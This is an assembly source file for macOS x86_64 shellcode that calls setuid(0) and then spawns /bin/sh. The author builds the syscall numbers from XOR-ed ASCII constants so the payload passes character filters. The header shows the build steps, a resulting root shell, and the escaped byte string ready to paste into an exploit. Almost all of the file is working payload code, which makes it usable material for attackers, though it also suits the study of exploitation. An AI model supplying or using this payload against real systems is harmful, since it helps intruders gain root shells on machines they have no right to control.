; ------------------------------------------------------------------------------
; (mostly) ASCII setuid shellcode
; for OS X (x86_64)
; by @reptar_xl
;
; i hesitate to call this shell code because i haven't tested it in that way.
; all i know is, it works when compiled like this:
;
;
;     $ nasm -f macho64 ascii.asm && ld ascii.o -o ascii \
;       && sudo chown root:wheel ascii && sudo chmod 4755 ascii \
;       && ./ascii
;
;       ld: warning: -macosx_version_min not specified, assuming 10.10
;       bash-3.2# whoami
;       root
;
;
; btw, this is it, with the chars i couldn't remove, escaped like \xAA:
;
;     h>>>>h ;) XH5 ;) PZXH5)>><\x0f\x05hAAAAXH5zAACH\xbfj/bin/shH\xc1\xef\x08WT_RT^\x0f\x05
;
; it fits in a tweet!
;
; ------------------------------------------------------------------------------

BITS 64

section .text
global start

; ------------------------------------------------------------------------------
; setuid
; ------------------------------------------------------------------------------
; to make this as ascii as possible we can't just mov 0x2000017 into
; rax. i've done it using two ascii strings and xor'ing them, to get
; the OS X setuid syscall, 0x2000017.
;
;     0x3e3e3e3e, ascii: >>>>
;     0x3c3e3e29, ascii: <>>)
;
;     0x3e3e3e3e ^ 0x3c3e3e29 = 0x2000017
;
;  i hope that makes sense!
;
; ------------------------------------------------------------------------------
start:
  push 0x3e3e3e3e       ; ascii: >>>>

  push 0x20293b20       ; ascii way of doing "xor rax, rax"
  pop  rax              ; 0x20293b20 = ' ;) ' (no quotes)
  xor  rax, 0x20293b20  

  push rax              ; this is just "mov rdx, 0"
  pop  rdx              ; doing it like this because push/pop are more ascii

  pop  rax              ; rax = 0x3e3e3e3e
  xor  rax, 0x3c3e3e29  ; as i explained above! rax now equals 0x20000017.
  syscall

; ------------------------------------------------------------------------------
; shell
; ------------------------------------------------------------------------------
; same idea as above. this time the strings are:
;
;     0x41414141, ascii: AAAA
;     0x4341417a, ascii: CAAz
;
;     0x41414141 ^ 0x4341417a = 0x200005b, execve syscall
; ------------------------------------------------------------------------------
  push 0x41414141               ; AAAA
  pop  rax                      ; remember? no mov's
  xor  rax, 0x4341417a          ; rax is 0x200005b, ready to go

  ; This bit I didn't write, I got it from http://nets.ec maybe... 
  ; I don't remember
  mov  rdi, 0x68732f6e69622f6a  ; move 'hs/nib/j' into rdi
  shr  rdi, 0x8                 ; null trunc the backwards value to '\0hs/nib/'
  push rdi
  push rsp                      ; rsp = value of last frame from rdi
  pop  rdi                      ; rdi is now a pointer to '/bin/sh\0'

  push rdx                      ; nulls
  push rsp
  pop  rsi
  syscall                       ; BAM
